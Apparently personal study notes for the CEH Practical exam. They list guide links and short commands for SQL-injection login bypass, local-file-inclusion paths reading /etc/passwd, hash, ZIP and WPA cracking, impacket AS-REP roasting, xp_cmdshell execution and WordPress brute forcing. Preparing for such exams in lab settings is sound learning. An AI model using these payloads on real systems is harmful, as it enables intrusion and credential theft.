# Practical voorbereiding
https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master

https://ceh-practical.cavementech.com/module-2.-footprinting-and-reconnaissance/1.-footprinting-through-search-engines

https://conflick0.github.io/CEH/

https://github.com/Aftab700/CEH_Notes?tab=readme-ov-file




#bypass login by sql injection
username:  ' OR '1'='1' --    
of   
' OR 1=1 --
admin'--
admin' #
admin'/*
' OR 1=1#
' OR 1=1/*

administrator'--
password: blank

#crack hashes
hashid [hash]
hashcat -m [hash_mode] -a 0 [hash_file] [wordlist]

#banner grabbing
nc -v [IP] 80
send >    GET / HTTP/1.1


#dns
dig website.com ANY

#hidden directories
Dir buster

#crack encrypted ZIP
zip2john file.zip > hash.txt
john --wordlist=wordlist.txt hash.txt

#Local file Inclusion 
detect vulnarability
http://example.com/?file=../../../../etc/passwd
of
http://example.com/show.asp?view=../../../../../Windows/system.ini
http://example.com/view.php?page=../../../../etc/passwd
of document=


#Detect ARP spoofing
ARPWatch


#AS_REP
impacket-GetNPUUsers -no-pass -usersfile users.txt -dc-ip 192.168.10.22 LABO.LOCAL
copy hash to txt > john

#sql client
impacket-mssqlclient user:psswd@10.11.12.1
EXEC xp_cmdshell 'powershell -command "(get-item \"c:\temp\test.txt\").length"'

#entropy
DIE.exe
or
Ent file1.elf
Ent file2.elf

#steno
steghide extract -sf file.jpg
Or
Openstego (windows)

#vulnerability web
wapiti
nikto -h
zaproxy


#SQL injection
console browser > document.cookie


#wireshark
frame contains "High_humidity"
protocol iot MQTT

#RAT
typical RAT ports
typical RAT ports. 5552, 1234, 1243, 31337, 5110, 6776, 4444

#wifi wpa
aircrack-ng -a2 -b MACBSSID -w /home/root/Desktop/password.txt WIFI.cap

#Malware entrypoint
PEExplorer
Objdump -f file.elf for linux


#metasploit
ssh_login
exploit_suggestionter

#nmap scripts
http-headers
smb2-security-mode
smb-os-discovery

#extra
How many machines are active > netdiscover
With machine has ftp > nmap
Find out phone number of webapplication > sqlmap
Bruteforce wordpress users password > wpscan
Decode .hex file > cryptool
Pcap > wireshark
Decoce the given text using given sectret > BCTextEncoder
Calculate SHA1 of a text > Hashcalc
Decrypt volume > Veracrypt
Crack the given hash > hashes.com
Find Secret in hidden Image/File > OpenStego/Snow
Find secret file in android > ADB
Send data to another machine(firewall blocked) > Use convert TCP

#openvas
docker run -d -p 443:443 --name openvas mikesplain/openvas



